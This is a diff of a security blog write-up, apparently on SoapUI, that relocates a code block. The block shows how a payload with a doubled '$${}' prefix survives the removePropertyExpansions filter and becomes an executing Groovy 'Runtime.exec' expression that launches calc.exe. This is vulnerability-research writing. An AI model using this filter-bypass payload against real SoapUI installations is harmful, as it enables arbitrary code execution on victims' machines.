@@ -91,6 +91,12 @@ Click on 'Send Request' and observe the execution of the calculator.
 
 With updated payload we can see that below method has removed only this ${} content from payload and return updated string as.
 
+Updated string:
+
+```java
+$${}{=Runtime.getRuntime().exec('calc.exe')}; to ${=Runtime.getRuntime().exec('calc.exe')};
+```
+
 Method:
 
 ```java
@@ -101,11 +107,7 @@ com.eviware.soapui.support.Tools : java.lang.String removePropertyExpansions(jav
 Logs:
 ![image](https://github.com/spookhorror/Blogs/assets/67255423/53ea39b0-a44c-44db-8512-0252463551fc)
 
-Updated string:
 
-```java
-$${}{=Runtime.getRuntime().exec('calc.exe')}; to ${=Runtime.getRuntime().exec('calc.exe')};
-```
 
 Here is updated content of request which contain malicious groovy script.
 ![image](https://github.com/spookhorror/Blogs/assets/67255423/a2927359-020a-483a-9c87-a522f3f33c3b)
